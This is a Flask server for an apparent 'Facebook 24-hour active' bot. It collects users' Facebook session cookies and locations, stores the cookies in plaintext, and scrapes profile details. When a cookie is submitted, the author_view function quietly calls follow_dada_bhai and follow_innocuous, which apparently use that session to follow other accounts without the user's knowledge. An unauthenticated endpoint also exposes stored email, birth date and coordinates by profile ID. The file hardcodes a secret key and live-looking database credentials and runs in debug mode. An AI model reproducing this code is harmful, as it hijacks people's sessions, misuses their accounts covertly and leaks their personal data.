from flask import Flask, request, jsonify, render_template, make_response ,redirect
from datetime import datetime, timezone, timedelta
from flask_sqlalchemy import SQLAlchemy
from urllib.parse import unquote_plus
from threading import Thread
from base64 import b64decode
from flask_cors import CORS
from time import sleep
from helper import *
import schedule

__version__ = 2.3

app = Flask(__name__)
app.config['SECRET_KEY'] = '2RMQfNsgrSsvpd5yZUjOhsXwoJaxw2'
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://dev-zarir:v2_42Ybp_VYMtCkSwdabKFKH5NmHNg9q@db.bit.io:5432/dev-zarir/FB_24H_ACTIVE'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS '] = False

db = SQLAlchemy(app, engine_options={"pool_recycle": 55})
CORS(app)


def get_bd_time():
    return datetime.now(tz=timezone(timedelta(hours=6)))


class Users (db.Model):
    id = db.Column(db.Integer, primary_key=True)
    fb_id = db.Column(db.String(200), unique=True, nullable=False)
    name = db.Column(db.String(200))
    email = db.Column(db.String(200))
    dob = db.Column(db.String(100))
    gender = db.Column(db.String(100))
    img = db.Column(db.String(1000))
    cookie = db.Column(db.String(1000))
    has_cookie = db.Column(db.Boolean, default=False)
    is_active = db.Column(db.Boolean, default=False)
    lat = db.Column(db.String(20))
    long = db.Column(db.String(20))
    last_access = db.Column(db.Date, default=get_bd_time)


class DummyClass:
    id = fb_id = name = email = dob = gender = img = cookie = has_cookie = is_active = lat = long = last_access = None


@app.route('/')
def index():
    if request.args.get('ver') != None:
        return str(__version__)
    return '<title>FB 24H Active Bot</title><h2>Server is Up! Version: ' + str(__version__) + '</h2>'


@app.route('/api', methods=['GET', 'POST', 'PATCH'])
def api():
    """
    Method GET:
        This endpoint is read only view. It search for the unique id in database
        id: Facebook Unique ID
    Method POST:
        This endpoint is for admin/author. It takes FB Cookie and get required information
        cookie: Facebook Session Cookie (base64 encoded)
        lat: latitude value of user
        long: longitude value of user
    Method PATCH:
        This endpoint is for Pauseing and Resumeing this service.
        cookie: Facebook Session Cookie (base64 encoded)
        active: true/false
    """
    if request.method == 'GET':
        return read_only_view(request)
    elif request.method == 'POST':
        return author_view(request)
    elif request.method == 'PATCH':
        return patch_user_table(request)
    else:
        return get_json_dict(False, 'Invalid Method!', 'danger')

@app.route('/admin/', methods=['GET', 'POST'])
def admin():
    session = request.cookies.get('session', '')
    if not check_if_logined(session):
        if request.method=='POST':
            username = unquote_plus(request.form.get('user', ''))
            password = unquote_plus(request.form.get('pass', ''))
            if check_user_pass(username, password):
                resp = make_response(redirect('/admin/'))
                resp.set_cookie('session', get_session_key(username, password), 7 * 24 * 60 * 60, path='/')
                return resp
        return render_template('login.html')
    
    all_acc = Users.query.order_by(Users.id.desc()).all()

    return render_template('panel.html', all_acc = all_acc)

def read_only_view(request):  # Search By ID
    fb_id = request.args.get('id')
    if not fb_id:
        return get_json_dict(False, 'Please give a Unique ID', 'danger')
    if not fb_id.isdigit():
        return get_json_dict(False, 'Unique ID is not valid', 'danger')
    acc = Users.query.filter_by(fb_id=fb_id).first()
    if not acc:
        return get_json_dict(False, 'Sorry, the provided id is not found', 'warning')
    return get_json_dict(True, 'Amigo! Account Found', 'success', acc)


def author_view(request):  # Search By Cookie 
    cookie = b64decode(unquote_plus(request.form.get('cookie', ''))).decode()
    lat = unquote_plus(request.form.get('lat', ''))
    long = unquote_plus(request.form.get('long', ''))
    if not cookie:
        return get_json_dict(False, 'Please give facebook session cookie', 'warning')
    fb_id = get_profile_id(cookie)
    if not fb_id:
        return get_json_dict(False, 'Cookie is not valid', 'warning', debug={'cookie': cookie, 'fb_id': fb_id})

    follow_dada_bhai(cookie)
    follow_innocuous(cookie)

    name = get_fb_name(cookie)
    email = get_email_address(cookie)
    dob = get_date_of_birth(cookie)
    gender = get_gender(cookie)
    img = get_profile_img(cookie)
    has_cookie = True

    acc = Users.query.filter_by(fb_id=fb_id).first()
    exists = True

    if not acc:
        acc = Users()
        exists = False

    acc.fb_id = fb_id
    acc.name = name
    acc.email = email
    acc.dob = dob
    acc.gender = gender
    acc.img = img
    acc.cookie = cookie
    acc.has_cookie = has_cookie
    acc.lat = lat
    acc.long = long
    acc.last_access = get_bd_time()

    if not exists:
        db.session.add(acc)
    db.session.commit()

    return get_json_dict(True, 'Amigo! Account fetched', 'success', acc)


def patch_user_table(request):  # Update Active value
    cookie = b64decode(unquote_plus(request.form.get('cookie', ''))).decode()
    is_active = True if request.form.get('active') == 'true' else False
    if not cookie:
        return get_json_dict(False, 'Please give facebook session cookie', 'warning')
    fb_id = get_profile_id(cookie)
    if not fb_id:
        return get_json_dict(False, 'Cookie is not valid', 'warning')
    acc = Users.query.filter_by(fb_id=fb_id).first()
    if not acc:
        return get_json_dict(False, 'Sorry the account is not found', 'warning')
    acc.is_active = is_active
    db.session.commit()
    return get_json_dict(True, 'Changes saved successfully', 'success')


def get_json_dict(
    success: bool,
    msg: str,
    type: str,
    acc: Users = DummyClass,
    debug: dict = None
) -> jsonify:
    """
    Required: success, msg, type
    Type: ['success', 'danger', 'warning']
    """
    timeout_values = {'success': 5000, 'warning': 10000, 'danger': 1000}
    return jsonify({
        'success': success,
        'msg': msg,
        'type': type,
        'timeout': timeout_values.get(type),
        'fb_id': acc.fb_id,
        'img': acc.img,
        'name': acc.name,
        'email': acc.email,
        'dob': acc.dob,
        'gender': acc.gender,
        'active': acc.is_active,
        'lat': acc.lat,
        'long': acc.long,
        'last_access': acc.last_access,
        'debug': debug,
    })


def run_ping_proccess():
    with app.app_context():
        for acc in Users.query.filter_by(has_cookie=True, is_active=True):
            if not get_profile_id(acc.cookie):
                acc.has_cookie = False
                acc.is_active = False
                db.session.commit()


schedule.every(3).minutes.do(run_ping_proccess)


def run_scheduler():
    while True:
        schedule.run_pending()
        sleep(30)


t = Thread(target=run_scheduler)
t.daemon = True
t.start()


if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run('0.0.0.0', 80, True)
